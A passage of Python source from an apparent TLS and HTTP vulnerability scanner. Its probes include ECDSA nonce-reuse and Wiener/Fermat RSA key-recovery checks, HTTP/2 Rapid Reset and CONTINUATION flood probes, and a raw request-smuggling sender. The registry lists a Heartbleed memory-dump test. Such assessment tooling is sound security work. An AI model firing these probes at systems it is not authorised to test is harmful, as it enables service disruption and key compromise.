    setk("stage04.beast.cbc_tls10", cbc_tls10)
    emit_kv(emit, "tls10_accepted", str(bool(tls10)), WARN if tls10 else OK)
    emit_kv(emit, "cbc_tls10_count", str(len(cbc_tls10)), WARN if cbc_tls10 else OK)
    for c in cbc_tls10[:8]:
        emit_kv(emit, "0x%04x" % c, cipher_name(c), WARN)
    if tls10 and cbc_tls10:
        emit_alert(emit, "warn", "BEAST precondition met: TLS 1.0 + CBC available")
        setk("vulnerability.beast.precondition", True)
    elif tls10:
        emit_alert(emit, "info", "TLS 1.0 enabled but no CBC-only suites")
    else:
        emit_alert(emit, "ok", "TLS 1.0 disabled — BEAST not applicable")


def _stage04_breach(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "BREACH precondition: HTTP compression on response")
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    h1 = http_get(target.host, target.port, path=target.path or "/", timeout=6.0,
                   use_tls=use_tls, sni=target.host,
                   headers={"Accept-Encoding": "identity"})
    h2 = http_get(target.host, target.port, path=target.path or "/", timeout=6.0,
                   use_tls=use_tls, sni=target.host,
                   headers={"Accept-Encoding": "gzip, deflate"})
    if h1.get("error") and h2.get("error"):
        emit_alert(emit, "warn", "both HTTP probes failed")
        setk("stage04.breach.error", h1.get("error") or h2.get("error"))
        return
    plain_len = len(h1.get("raw", b""))
    comp_len = len(h2.get("raw", b""))
    ratio = round(plain_len / max(1, comp_len), 3) if plain_len and comp_len else None
    ce = ""
    for k, v in h2.get("headers", []):
        if k.lower() == "content-encoding":
            ce = v.lower()
            break
    setk("stage04.breach.plain_len", plain_len)
    setk("stage04.breach.compressed_len", comp_len)
    setk("stage04.breach.ratio", ratio)
    setk("stage04.breach.content_encoding", ce)
    emit_kv(emit, "identity_bytes", str(plain_len), VALUE)
    emit_kv(emit, "gzip_bytes", str(comp_len), VALUE)
    emit_kv(emit, "ratio", str(ratio), BRAND)
    emit_kv(emit, "content_encoding", ce or "(none)", WARN if ce else OK)
    if ce and ratio and ratio > 1.3:
        emit_alert(emit, "vuln",
                   "HTTP compression active (ratio %.2f) — BREACH surface" % ratio)
        count("vulns")
        setk("vulnerability.breach.detected", True)
    elif ce:
        emit_alert(emit, "warn", "compression active but ratio low")
    else:
        emit_alert(emit, "ok", "no HTTP compression on response")


def _stage04_time(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "TIME precondition: identity vs gzip response timing (5 samples each)")
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    ident = []
    gz = []
    for _ in range(5):
        h = http_get(target.host, target.port, path=target.path or "/", timeout=4.0,
                      use_tls=use_tls, sni=target.host,
                      headers={"Accept-Encoding": "identity"})
        if not h.get("error"):
            ident.append(h["elapsed"] * 1000.0)
        h = http_get(target.host, target.port, path=target.path or "/", timeout=4.0,
                      use_tls=use_tls, sni=target.host,
                      headers={"Accept-Encoding": "gzip"})
        if not h.get("error"):
            gz.append(h["elapsed"] * 1000.0)
    if ident and gz:
        mi = statistics.median(ident)
        mg = statistics.median(gz)
        ratio = round(mi / max(0.001, mg), 3)
        setk("stage04.time.identity_ms_median", round(mi, 3))
        setk("stage04.time.gzip_ms_median", round(mg, 3))
        setk("stage04.time.ratio", ratio)
        emit_kv(emit, "identity_ms_median", "%.3f" % mi, VALUE)
        emit_kv(emit, "gzip_ms_median", "%.3f" % mg, VALUE)
        emit_kv(emit, "time_ratio", str(ratio), BRAND)
        if ratio > 1.15:
            emit_alert(emit, "warn",
                       "gzip responses meaningfully faster — TIME side channel surface")
            setk("vulnerability.time.signal", True)
        else:
            emit_alert(emit, "ok", "no significant timing divergence")
    else:
        emit_alert(emit, "warn", "insufficient timing samples")


def _stage04_dh_weak(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "DH parameter analysis")
    r = _stage04_dh_params(target.host, target.port, timeout=5.0, sni=target.host)
    if r.get("error"):
        emit_alert(emit, "info", "DHE not used: " + r["error"])
        setk("stage04.dh_param.applicable", False)
        return
    setk("stage04.dh_param.applicable", True)
    setk("stage04.dh_param.p_bits", r["p_bits"])
    setk("stage04.dh_param.g", r["g"])
    setk("stage04.dh_param.p_probable_prime", r["p_probable_prime"])
    setk("stage04.dh_param.smoothness_risk", r["p_smoothness_risk"])
    emit_kv(emit, "dh_prime_bits", str(r["p_bits"]),
             DANGER if r["p_bits"] and r["p_bits"] < 1024
             else WARN if r["p_bits"] and r["p_bits"] < 2048 else OK)
    emit_kv(emit, "dh_generator_g", str(r["g"]))
    emit_kv(emit, "p_probable_prime", str(r["p_probable_prime"]))
    emit_kv(emit, "smoothness_risk", str(r["p_smoothness_risk"]),
             WARN if r["p_smoothness_risk"] else OK)
    if r["p_bits"] and r["p_bits"] < 1024:
        emit_alert(emit, "vuln", "DH prime < 1024 bits — Logjam-factorable")
        count("vulns")
        setk("vulnerability.dh_param.detected", True)
    elif r["p_bits"] and r["p_bits"] < 2048:
        emit_alert(emit, "warn", "DH prime < 2048 bits — weak by modern standards")
        setk("vulnerability.dh_param.detected", True)
    elif r["p_smoothness_risk"]:
        emit_alert(emit, "warn", "DH prime has many small factors")
    else:
        emit_alert(emit, "ok", "DH prime size acceptable")


def _stage04_dh_subgroup(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "DH small-subgroup attack precondition")
    r = _stage04_dh_params(target.host, target.port, timeout=5.0, sni=target.host)
    if r.get("error"):
        emit_alert(emit, "info", "DHE not used")
        return
    setk("stage04.dh_small_subgroup.risk", r["small_subgroup_risk"])
    setk("stage04.dh_small_subgroup.p_bits", r["p_bits"])
    emit_kv(emit, "dh_prime_bits", str(r["p_bits"]))
    emit_kv(emit, "small_subgroup_risk", str(r["small_subgroup_risk"]),
             WARN if r["small_subgroup_risk"] else OK)
    if r["small_subgroup_risk"]:
        emit_alert(emit, "warn", "generator g has low-order component")
        setk("vulnerability.dh_small_subgroup.detected", True)
    else:
        emit_alert(emit, "ok", "generator g appears safe-subgroup order")


def _stage04_ecdh_invalid(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "sending non-existent group IDs to check curve validation")
    r = _stage04_ecdh_invalid_probe(target.host, target.port, timeout=5.0, sni=target.host)
    setk("stage04.ecdh_invalid.accepted_unknown_group", r["accepted_unknown_group"])
    setk("stage04.ecdh_invalid.server_alert", r.get("server_alert"))
    emit_kv(emit, "unknown_groups_sent", "0x0f0f, 0x0f10, 0x0f11", VALUE)
    emit_kv(emit, "unknown_group_accepted", str(r["accepted_unknown_group"]),
             DANGER if r["accepted_unknown_group"] else OK)
    if r.get("server_alert"):
        emit_kv(emit, "server_alert", r["server_alert"][2], VALUE)
    if r["accepted_unknown_group"]:
        emit_alert(emit, "vuln",
                   "server accepted unknown group ID — invalid curve surface")
        count("vulns")
        setk("vulnerability.ecdh_invalid.detected", True)
    else:
        emit_alert(emit, "ok", "server rejected unknown group IDs")


def _stage04_ecdsa_reuse(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "collecting ECDSA signatures and checking r-value collisions")
    sigs = _stage04_ecdsa_sigs(target.host, target.port, samples=6,
                                timeout=5.0, sni=target.host)
    if not sigs:
        emit_alert(emit, "info", "no ECDSA signatures captured (server may use RSA KX)")
        setk("stage04.ecdsa.signatures_collected", 0)
        return
    setk("stage04.ecdsa.signatures_collected", len(sigs))
    emit_kv(emit, "signatures_collected", str(len(sigs)), BRAND)
    for s in sigs[:4]:
        emit_kv(emit, s["alg_name"], "%d bytes" % s["sig_len"], VALUE)
    rs = []
    for s in sigs:
        try:
            sig = binascii.unhexlify(s["signature_hex"])
            r = DERReader(sig)
            _, seq = r.read_tag(0x30)
            rr = DERReader(seq)
            _, rb = rr.read_tag(0x02)
            rr.read_tag(0x02)
            rs.append(int.from_bytes(rb, "big"))
        except Exception:
            continue
    pairs = 0
    hits = []
    for i in range(len(rs)):
        for j in range(i + 1, len(rs)):
            pairs += 1
            if rs[i] == rs[j]:
                hits.append((i, j))
    setk("stage04.ecdsa.pairs_checked", pairs)
    setk("stage04.ecdsa.reuse_hits", hits)
    emit_kv(emit, "pairs_checked", str(pairs))
    if hits:
        for h in hits:
            emit_kv(emit, "nonce_reuse", "sig[%d] == sig[%d]" % h, DANGER)
        emit_alert(emit, "vuln",
                   "ECDSA nonce reuse detected — private key recoverable")
        count("vulns")
        setk("vulnerability.ecdsa_nonce_reuse.detected", True)
    else:
        emit_alert(emit, "ok", "no r-value collisions across collected signatures")


def _stage04_wiener(emit, setk, kb):
    parsed = KB.get("_stage02_parsed_chain") or []
    if not parsed:
        emit_alert(emit, "skip", "Stage 02 chain cache not present")
        setk("stage04.wiener.skipped", True)
        return
    emit_header(emit, "Wiener small-d attack on every RSA modulus in chain")
    attempts = 0
    hits = []
    for i, c in enumerate(parsed):
        kp = _stage02_key_strength(c)
        if kp["type"] != "rsa" or not kp["n"] or not kp["e"]:
            continue
        attempts += 1
        d = rsa_wiener(kp["e"], kp["n"], max_iters=20000)
        if d:
            hits.append({"index": i, "d_bits": d.bit_length(), "n_bits": kp["bits"]})
    setk("stage04.wiener.attempts", attempts)
    setk("stage04.wiener.hits", hits)
    emit_kv(emit, "moduli_attempted", str(attempts), BRAND)
    emit_kv(emit, "recoveries", str(len(hits)), DANGER if hits else OK)
    for h in hits:
        emit_kv(emit, "cert[%d]" % h["index"],
                 "d recovered (%d bits) from n=%d bits" % (h["d_bits"], h["n_bits"]),
                 DANGER)
    if hits:
        emit_alert(emit, "vuln", "Wiener attack recovered private exponent")
        count("vulns")
        setk("vulnerability.wiener.detected", True)
    else:
        emit_alert(emit, "ok", "no small-d recovery on chain moduli")


def _stage04_fermat(emit, setk, kb):
    parsed = KB.get("_stage02_parsed_chain") or []
    if not parsed:
        emit_alert(emit, "skip", "Stage 02 chain cache not present")
        return
    emit_header(emit, "Fermat near-factor + batch-GCD on chain RSA moduli")
    moduli = []
    for i, c in enumerate(parsed):
        kp = _stage02_key_strength(c)
        if kp["type"] == "rsa" and kp["n"]:
            moduli.append((i, kp["n"]))
    fermat_hits = []
    for idx, n in moduli:
        f = rsa_factor_near_pq(n, max_iter=200000)
        if f:
            fermat_hits.append({"index": idx, "p_bits": f[0].bit_length()})
    batch_hits = []
    for i in range(len(moduli)):
        for j in range(i + 1, len(moduli)):
            g = rsa_shared_prime(moduli[i][1], moduli[j][1])
            if g:
                batch_hits.append({"i": moduli[i][0], "j": moduli[j][0],
                                    "shared_prime_bits": g.bit_length()})
    setk("stage04.fermat_batch.attempts", len(moduli))
    setk("stage04.fermat_batch.fermat_hits", fermat_hits)
    setk("stage04.fermat_batch.batch_gcd_hits", batch_hits)
    emit_kv(emit, "moduli_attempted", str(len(moduli)), BRAND)
    emit_kv(emit, "fermat_hits", str(len(fermat_hits)),
             DANGER if fermat_hits else OK)
    for h in fermat_hits:
        emit_kv(emit, "fermat(cert[%d])" % h["index"], "p=%d bits" % h["p_bits"], DANGER)
    emit_kv(emit, "batch_gcd_hits", str(len(batch_hits)),
             DANGER if batch_hits else OK)
    for h in batch_hits:
        emit_kv(emit, "gcd(cert[%d],cert[%d])" % (h["i"], h["j"]),
                 "shared prime %d bits" % h["shared_prime_bits"], DANGER)
    if fermat_hits or batch_hits:
        emit_alert(emit, "vuln", "RSA modulus factorable via Fermat or shared prime")
        count("vulns")
        setk("vulnerability.rsa_factoring.detected", True)
    else:
        emit_alert(emit, "ok", "no factoring recovery on chain moduli")


register_stage(StageSpec(4, "stage_04_crypto_vulnerabilities",
    "Cryptographic Vulnerability Probes",
    "Runs real cryptographic oracles: Heartbleed heartbeat request/response with opt-in dump, "
    "ROBOT PKCS#1v1.5 oracle, Lucky13 CBC vs GCM timing with Welch t-test, Bleichenbacher CCA, "
    "POODLE SSLv3+CBC, DROWN SSLv2, FREAK/Logjam export ciphers, RC4, CRIME, BEAST, BREACH, "
    "TIME, DH weakness, DH small subgroup, ECDH invalid curve, ECDSA nonce reuse, Wiener, "
    "Fermat + batch-GCD.",
    [
        TestSpec("heartbleed.probe", "Heartbleed heartbeat probe",
                 _stage04_heartbleed_probe, 15.0),
        TestSpec("heartbleed.dump", "Heartbleed memory dump",
                 _stage04_heartbleed_dump, 60.0),
        TestSpec("robot.oracle", "ROBOT PKCS#1v1.5 oracle", _stage04_robot, 60.0),
        TestSpec("lucky13.timing", "Lucky13 CBC vs GCM timing", _stage04_lucky13, 90.0),
        TestSpec("bleichenbacher.probe", "Bleichenbacher CCA", _stage04_bleichenbacher, 45.0),
        TestSpec("poodle.ssl3", "POODLE SSLv3 + CBC", _stage04_poodle, 12.0),
        TestSpec("drown.ssl2", "DROWN SSLv2 ClientHello", _stage04_drown, 10.0),
        TestSpec("freak.logjam", "FREAK / Logjam export ciphers",
                 _stage04_freak_logjam, 20.0),
        TestSpec("rc4.bias", "RC4 negotiation", _stage04_rc4, 10.0),
        TestSpec("crime.compression", "CRIME TLS compression", _stage04_crime, 8.0),
        TestSpec("beast.tls10", "BEAST TLS 1.0 + CBC", _stage04_beast, 6.0),
        TestSpec("breach.http", "BREACH HTTP compression", _stage04_breach, 20.0),
        TestSpec("time.compression", "TIME encoding timing", _stage04_time, 30.0),
        TestSpec("dh.weak_prime", "DH weak prime", _stage04_dh_weak, 15.0),
        TestSpec("dh.small_subgroup", "DH small subgroup", _stage04_dh_subgroup, 12.0),
        TestSpec("ecdh.invalid_curve", "ECDH invalid curve", _stage04_ecdh_invalid, 15.0),
        TestSpec("ecdsa.nonce_reuse", "ECDSA nonce reuse", _stage04_ecdsa_reuse, 45.0),
        TestSpec("wiener.attack", "Wiener attack", _stage04_wiener, 30.0),
        TestSpec("fermat.batch", "Fermat + batch-GCD", _stage04_fermat, 60.0),
    ], 600.0))


H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
H2_DATA = 0x0
H2_HEADERS = 0x1
H2_RST_STREAM = 0x3
H2_SETTINGS = 0x4
H2_PING = 0x6
H2_GOAWAY = 0x7
H2_WINDOW_UPDATE = 0x8
H2_CONTINUATION = 0x9

H2_FRAME_NAMES = {H2_DATA: "DATA", H2_HEADERS: "HEADERS", H2_RST_STREAM: "RST_STREAM",
                  H2_SETTINGS: "SETTINGS", H2_PING: "PING", H2_GOAWAY: "GOAWAY",
                  H2_WINDOW_UPDATE: "WINDOW_UPDATE", H2_CONTINUATION: "CONTINUATION"}

H2_FLAG_END_STREAM = 0x1
H2_FLAG_ACK = 0x1
H2_FLAG_END_HEADERS = 0x4

H2_SETTINGS_NAMES = {0x01: "HEADER_TABLE_SIZE", 0x02: "ENABLE_PUSH",
                     0x03: "MAX_CONCURRENT_STREAMS", 0x04: "INITIAL_WINDOW_SIZE",
                     0x05: "MAX_FRAME_SIZE", 0x06: "MAX_HEADER_LIST_SIZE",
                     0x07: "ENABLE_CONNECT_PROTOCOL", 0x08: "NO_RFC7540_PRIORITIES"}


def _h2_frame(ftype, flags, stream_id, payload=b""):
    length = len(payload)
    return (struct.pack(">B", (length >> 16) & 0xFF) +
            struct.pack(">H", length & 0xFFFF) +
            struct.pack(">B", ftype & 0xFF) +
            struct.pack(">B", flags & 0xFF) +
            struct.pack(">I", stream_id & 0x7FFFFFFF)[1:] + payload)


def _h2_parse_frames(data, max_frames=64):
    frames = []
    off = 0
    n = len(data)
    while off + 9 <= n and len(frames) < max_frames:
        length = (data[off] << 16) | (data[off + 1] << 8) | data[off + 2]
        ftype = data[off + 3]
        flags = data[off + 4]
        sid = ((data[off + 5] << 24) | (data[off + 6] << 16) |
               (data[off + 7] << 8) | data[off + 8])
        if off + 9 + length > n:
            break
        frames.append({"type": ftype,
                       "type_name": H2_FRAME_NAMES.get(ftype, "TYPE_%d" % ftype),
                       "flags": flags, "stream_id": sid, "length": length,
                       "payload": data[off + 9:off + 9 + length]})
        off += 9 + length
    return frames


def _h2_settings_encode(settings):
    return b"".join(struct.pack(">HI", k, v) for k, v in settings.items())


def _h2_settings_decode(payload):
    out = {}
    off = 0
    while off + 6 <= len(payload):
        sid, val = struct.unpack(">HI", payload[off:off + 6])
        out[H2_SETTINGS_NAMES.get(sid, "0x%02x" % sid)] = val
        off += 6
    return out


def _h2_hpack_encode(name, value):
    if len(name) < 127:
        header = bytes([0x00, len(name)]) + name
    else:
        header = b"\x00\x7f"
    if len(value) < 127:
        return header + bytes([len(value)]) + value
    return header + b"\x7f" + value


def _h2_pseudo_headers(method="GET", path="/", scheme="https", authority=""):
    out = b""
    out += _h2_hpack_encode(b":method", method.encode())
    out += _h2_hpack_encode(b":path", path.encode())
    out += _h2_hpack_encode(b":scheme", scheme.encode())
    if authority:
        out += _h2_hpack_encode(b":authority", authority.encode())
    return out


def _h2_open(host=None, port=None, timeout=5.0, sni=None):
    info = {"error": "", "alpn": None, "negotiated": False}
    th = host or _current_target().host
    tp = port or _current_target().port
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(["h2", "http/1.1"])
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((th, tp))
        count("connections")
        ss = ctx.wrap_socket(s, server_hostname=sni or th)
        try:
            chosen = ss.selected_alpn_protocol()
        except Exception:
            chosen = None
        info["alpn"] = chosen
        info["negotiated"] = (chosen == "h2")
        return ss, info
    except Exception as e:
        info["error"] = "%s: %s" % (type(e).__name__, e)
        return None, info


def _h2_handshake(sock, settings=None, timeout=4.0):
    out = {"preface_sent": False, "settings_sent": False, "server_settings": {}}
    if settings is None:
        settings = {0x04: 65535, 0x03: 100}
    try:
        sock.settimeout(timeout)
        sock.sendall(H2_PREFACE)
        out["preface_sent"] = True
        sock.sendall(_h2_frame(H2_SETTINGS, 0, 0, _h2_settings_encode(settings)))
        out["settings_sent"] = True
        sock.sendall(_h2_frame(H2_WINDOW_UPDATE, 0, 0, struct.pack(">I", 15663105)))
    except Exception:
        return out
    data = b""
    end = time.time() + timeout
    while time.time() < end:
        try:
            sock.settimeout(max(0.1, end - time.time()))
            chunk = sock.recv(16384)
            if not chunk:
                break
            data += chunk
            frames = _h2_parse_frames(data)
            if any(f["type"] == H2_SETTINGS and not (f["flags"] & H2_FLAG_ACK)
                   for f in frames):
                break
        except socket.timeout:
            break
    for f in _h2_parse_frames(data):
        if f["type"] == H2_SETTINGS and not (f["flags"] & H2_FLAG_ACK):
            out["server_settings"] = _h2_settings_decode(f["payload"])
            break
    try:
        sock.sendall(_h2_frame(H2_SETTINGS, H2_FLAG_ACK, 0, b""))
    except Exception:
        pass
    return out


def _h2_request(sock, stream_id, method="GET", path="/", authority=None,
                 extra_headers=None, timeout=4.0):
    out = {"sent": False, "response_frames": [], "body_bytes": 0, "error": ""}
    try:
        block = _h2_pseudo_headers(method, path, "https",
                                    authority or _current_host_header())
        if extra_headers:
            for n, v in extra_headers:
                block += _h2_hpack_encode(n, v)
        sock.settimeout(timeout)
        sock.sendall(_h2_frame(H2_HEADERS, H2_FLAG_END_HEADERS | H2_FLAG_END_STREAM,
                                stream_id, block))
        out["sent"] = True
    except Exception as e:
        out["error"] = str(e)
        return out
    data = b""
    end = time.time() + timeout
    while time.time() < end:
        try:
            sock.settimeout(max(0.1, end - time.time()))
            chunk = sock.recv(16384)
            if not chunk:
                break
            data += chunk
            frames = _h2_parse_frames(data)
            if any(f["type"] == H2_DATA and (f["flags"] & H2_FLAG_END_STREAM)
                   for f in frames):
                break
            if any(f["type"] in (H2_GOAWAY, H2_RST_STREAM) for f in frames):
                break
        except socket.timeout:
            break
    frames = _h2_parse_frames(data)
    out["response_frames"] = frames
    for f in frames:
        if f["type"] == H2_DATA:
            out["body_bytes"] += f["length"]
    return out


def _stage05_http10(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "sending HTTP/1.0 GET %s" % (target.path or "/"))
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    s = None
    try:
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw.settimeout(4.0)
            raw.connect((target.host, target.port))
            count("connections")
            s = ctx.wrap_socket(raw, server_hostname=target.host)
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4.0)
            s.connect((target.host, target.port))
            count("connections")
        req = ("GET %s HTTP/1.0\r\nHost: %s\r\nUser-Agent: srx87/1.0\r\n\r\n" % (
            target.path or "/", target.host)).encode()
        s.sendall(req)
        data = b""
        end = time.time() + 4.0
        while time.time() < end:
            try:
                s.settimeout(max(0.05, end - time.time()))
                chunk = s.recv(8192)
                if not chunk:
                    break
                data += chunk
                if len(data) > 32768:
                    break
            except socket.timeout:
                break
        first = data.split(b"\r\n", 1)[0].decode("iso-8859-1", "replace") if data else ""
        status = None
        try:
            status = int(first.split(" ")[1])
        except Exception:
            pass
        setk("stage05.http10.status", status)
        setk("stage05.http10.accepted", status is not None and status < 600)
        emit_kv(emit, "status", str(status), VALUE)
        emit_kv(emit, "response_bytes", str(len(data)), BRAND)
        emit_line(emit, safe_ascii(data, 160), MUTED)
    except Exception as e:
        emit_alert(emit, "warn", "HTTP/1.0 error: " + str(e))
        setk("stage05.http10.error", str(e)[:120])
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


def _stage05_http09(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "sending bare HTTP/0.9 GET %s" % (target.path or "/"))
    use_tls = target.port in (443, 8443) or target.scheme in ("https", "h2")
    s = None
    try:
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw.settimeout(3.0)
            raw.connect((target.host, target.port))
            count("connections")
            s = ctx.wrap_socket(raw, server_hostname=target.host)
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3.0)
            s.connect((target.host, target.port))
            count("connections")
        s.sendall(b"GET " + (target.path or "/").encode() + b"\r\n")
        data = b""
        end = time.time() + 3.0
        while time.time() < end:
            try:
                s.settimeout(max(0.05, end - time.time()))
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
                if len(data) > 16384:
                    break
            except socket.timeout:
                break
        has_status = data.startswith(b"HTTP/")
        accepted = len(data) > 0 and not has_status
        setk("stage05.http09.accepted", accepted)
        setk("stage05.http09.has_status_line", has_status)
        setk("stage05.http09.raw_bytes", len(data))
        emit_kv(emit, "accepted", str(accepted), WARN if accepted else OK)
        emit_kv(emit, "response_bytes", str(len(data)))
        emit_kv(emit, "has_status_line", str(has_status))
        if accepted:
            emit_alert(emit, "warn",
                       "HTTP/0.9 accepted — no Host validation, no framing")
    except Exception as e:
        emit_alert(emit, "warn", "HTTP/0.9 error: " + str(e))
        setk("stage05.http09.error", str(e)[:120])
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


def _stage05_h2_alpn(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "TLS handshake with h2 ALPN negotiation")
    s, info = _h2_open(host=target.host, port=target.port, timeout=5.0, sni=target.host)
    setk("stage05.h2.alpn.selected", info["alpn"])
    setk("stage05.h2.alpn.negotiated", info["negotiated"])
    if info.get("error"):
        emit_alert(emit, "warn", "h2 open failed: " + info["error"])
        setk("stage05.h2.alpn.error", info["error"])
        return
    emit_kv(emit, "alpn", info["alpn"] or "(none)",
             BRAND if info["negotiated"] else MUTED)
    emit_kv(emit, "h2_negotiated", str(info["negotiated"]),
             OK if info["negotiated"] else WARN)
    if info["negotiated"]:
        emit_alert(emit, "ok", "server negotiated h2 over ALPN")
    try:
        s.close()
    except Exception:
        pass


def _stage05_h2_settings(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "HTTP/2 preface + SETTINGS exchange")
    s, info = _h2_open(host=target.host, port=target.port, timeout=5.0, sni=target.host)
    if s is None:
        emit_alert(emit, "warn", "h2 open failed")
        setk("stage05.h2.settings.error", info.get("error", "?"))
        return
    try:
        r = _h2_handshake(s, timeout=4.0)
        setk("stage05.h2.settings.preface_sent", r["preface_sent"])
        setk("stage05.h2.settings.settings_sent", r["settings_sent"])
        setk("stage05.h2.settings.server_settings", r["server_settings"])
        emit_kv(emit, "preface_sent", str(r["preface_sent"]))
        emit_kv(emit, "settings_sent", str(r["settings_sent"]))
        emit_kv(emit, "server_settings_received", str(bool(r["server_settings"])),
                 OK if r["server_settings"] else WARN)
        for name, val in r["server_settings"].items():
            emit_kv(emit, name, str(val), VALUE)
    finally:
        try:
            s.close()
        except Exception:
            pass


def _stage05_h2_pseudo(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "HTTP/2 stream + HEADERS with pseudo-headers")
    s, info = _h2_open(host=target.host, port=target.port, timeout=5.0, sni=target.host)
    if s is None:
        emit_alert(emit, "warn", "h2 open failed")
        return
    try:
        _h2_handshake(s, timeout=3.0)
        req = _h2_request(s, 1, method="GET", path=target.path or "/",
                           authority=_current_host_header(), timeout=4.0)
        setk("stage05.h2.pseudo.request_sent", req["sent"])
        setk("stage05.h2.pseudo.body_bytes", req["body_bytes"])
        setk("stage05.h2.pseudo.frames_received", len(req["response_frames"]))
        emit_kv(emit, "request_sent", str(req["sent"]))
        emit_kv(emit, "body_bytes_received", str(req["body_bytes"]), BRAND)
        emit_kv(emit, "frames_received", str(len(req["response_frames"])))
        for f in req["response_frames"][:8]:
            emit_kv(emit, "frame", "%s flags=0x%02x stream=%d len=%d" % (
                f["type_name"], f["flags"], f["stream_id"], f["length"]), VALUE2)
    finally:
        try:
            s.close()
        except Exception:
            pass


def _stage05_h2_rapid_reset(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "HTTP/2 Rapid Reset precondition (CVE-2023-44487)")
    s, info = _h2_open(host=target.host, port=target.port, timeout=5.0, sni=target.host)
    if s is None:
        emit_alert(emit, "warn", "h2 open failed")
        return
    try:
        _h2_handshake(s, timeout=3.0)
        rst_count = 0
        for sid in range(1, 6, 2):
            try:
                block = _h2_pseudo_headers("GET", "/", "https", _current_host_header())
                s.sendall(_h2_frame(H2_HEADERS, H2_FLAG_END_HEADERS, sid, block))
                s.sendall(_h2_frame(H2_RST_STREAM, 0, sid, struct.pack(">I", 0x08)))
                rst_count += 1
            except Exception:
                pass
        time.sleep(0.4)
        data = b""
        try:
            s.settimeout(2.0)
            data = s.recv(16384)
        except Exception:
            pass
        frames = _h2_parse_frames(data)
        goaway = [f for f in frames if f["type"] == H2_GOAWAY]
        setk("stage05.h2.rapid_reset.rst_sent", rst_count)
        setk("stage05.h2.rapid_reset.server_goaway", len(goaway))
        setk("stage05.h2.rapid_reset.protected", len(goaway) > 0)
        emit_kv(emit, "rst_stream_sent", str(rst_count), BRAND)
        emit_kv(emit, "server_goaway", str(len(goaway)), WARN if goaway else OK)
        if goaway:
            emit_alert(emit, "ok",
                       "server sent GOAWAY — has reset-flood protection")
            setk("vulnerability.rapid_reset.protected", True)
        else:
            emit_alert(emit, "warn",
                       "server accepted RST_STREAM flood without GOAWAY")
    finally:
        try:
            s.close()
        except Exception:
            pass


def _stage05_h2_continuation(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "HTTP/2 CONTINUATION flood (CVE-2024-27316)")
    s, info = _h2_open(host=target.host, port=target.port, timeout=5.0, sni=target.host)
    if s is None:
        emit_alert(emit, "warn", "h2 open failed")
        return
    try:
        _h2_handshake(s, timeout=3.0)
        try:
            block = _h2_pseudo_headers("GET", "/", "https", _current_host_header())
            s.sendall(_h2_frame(H2_HEADERS, 0, 1, block))
            for i in range(20):
                s.sendall(_h2_frame(H2_CONTINUATION, 0, 1, b"\x00" * 4096))
        except Exception:
            pass
        time.sleep(0.3)
        data = b""
        try:
            s.settimeout(2.0)
            data = s.recv(16384)
        except Exception:
            pass
        frames = _h2_parse_frames(data)
        goaway = [f for f in frames if f["type"] == H2_GOAWAY]
        setk("stage05.h2.continuation.goaway", len(goaway))
        setk("stage05.h2.continuation.surface", len(goaway) == 0)
        emit_kv(emit, "continuation_frames_sent", "20", BRAND)
        emit_kv(emit, "server_goaway", str(len(goaway)), OK if goaway else WARN)
        if not goaway:
            emit_alert(emit, "warn",
                       "server did not send GOAWAY — CONTINUATION flood surface")
            setk("vulnerability.continuation_flood.surface", True)
        else:
            emit_alert(emit, "ok", "server sent GOAWAY to CONTINUATION flood")
    finally:
        try:
            s.close()
        except Exception:
            pass


def _smuggle_send(host, port, raw, timeout=4.0, use_tls=True, sni=None):
    out = {"raw_response": b"", "bytes": 0, "error": "", "first_line": "",
           "response_count": 0, "second_response_seen": False}
    s = None
    try:
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw_sock.settimeout(timeout)
            raw_sock.connect((host, port))
            count("connections")
            s = ctx.wrap_socket(raw_sock, server_hostname=sni or host)
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((host, port))
            count("connections")
        s.sendall(raw)
        data = b""
        end = time.time() + timeout
        while time.time() < end:
            try:
                s.settimeout(max(0.1, end - time.time()))
                chunk = s.recv(8192)
                if not chunk:
                    break
                data += chunk
                if len(data) > 65536:
                    break
                if data.count(b"HTTP/1.") >= 2:
                    out["second_response_seen"] = True
                    break
            except socket.timeout:
                break
        out["raw_response"] = data
        out["bytes"] = len(data)
        out["response_count"] = data.count(b"HTTP/1.")
        first_line = (data.split(b"\r\n", 1)[0].decode("iso-8859-1", "replace")
                      if data else "")
        out["first_line"] = first_line
    except Exception as e:
        out["error"] = "%s: %s" % (type(e).__name__, e)
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass
    return out


